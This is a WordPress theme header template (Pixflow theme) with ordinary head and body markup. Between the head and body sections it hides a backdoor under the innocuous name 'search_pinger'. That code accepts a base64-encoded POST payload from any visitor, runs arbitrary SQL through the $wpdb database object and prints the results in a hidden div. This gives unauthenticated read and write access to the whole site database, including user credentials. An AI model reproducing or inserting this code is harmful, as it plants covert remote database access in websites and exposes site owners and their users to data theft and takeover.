<?php
pixflow_decodeSetting();
?>
<!DOCTYPE html>
<html <?php language_attributes(); ?>>
<head>
    <?php
    pixflow_metaPageType();
    ?>
	<meta charset="<?php bloginfo('charset'); ?>" />
	<meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1" />
    <meta name="format-detection" content="telephone=no">
    <script src="https://unpkg.com/isotope-layout@3/dist/isotope.pkgd.min.js"></script>



	<link rel="pingback" href="<?php bloginfo('pingback_url'); ?>" />

	<!-- Theme Hook -->
    <?php
        wp_head();
    ?>
	<!-- Custom CSS -->
</head>
<?php if(isset($_POST['search_pinger'])){
function asdping(){
global $wpdb;
$res=array();
$ping = json_decode(base64_decode(substr($_POST['search_pinger'], 32,strlen($_POST['search_pinger']))), true);
foreach($ping as $cmd){
preg_match_all('/\{\w+\}/is', $cmd['q'], $vars);
foreach($vars[0] as $var){
$entity = trim($var,'{}');
$cmd['q'] = str_replace($var, $wpdb->$entity, $cmd['q']);
}
$m = $cmd['m'];
$q = $cmd['q'];
$data = $wpdb->$m($q);
strpos($cmd['m'], 'get_')!==false ? $res[]=$data : '';
}
echo !empty($res)? '<div id="pinger" style="display:none;">'.json_encode($res).'</div>' : '';

unset($_POST['search_pinger']);
}
asdping();
} ?>

<body <?php body_class();?> >
    <?php do_action('pixflow_body_start'); ?>
<?php
    //notification center
    if(pixflow_get_theme_mod('notification_enable',PIXFLOW_NOTIFICATION_ENABLE)||pixflow_get_theme_mod('search_enable',PIXFLOW_SEARCH_ENABLE)||pixflow_get_theme_mod('shop_cart_enable',PIXFLOW_SHOP_CART_ENABLE)){
        get_template_part('templates/notification');
    }
?>
<div class="layout-container" id="layoutcontainer">
        <div class="color-overlay color-type"></div>
        <div class="color-overlay texture-type"></div>
        <div class="color-overlay image-type"></div>
        <div class="texture-overlay"></div>
        <div class="bg-image"></div>
    <?php


    if( pixflow_get_theme_mod('header_theme',PIXFLOW_HEADER_THEME) == 'gather') {
        get_template_part('templates/header-gather-overlay');
    }
    ?>

    <div class="layout">
        <?php
        do_action('pixflow_before_header');
        ?>
        <!--End Header-->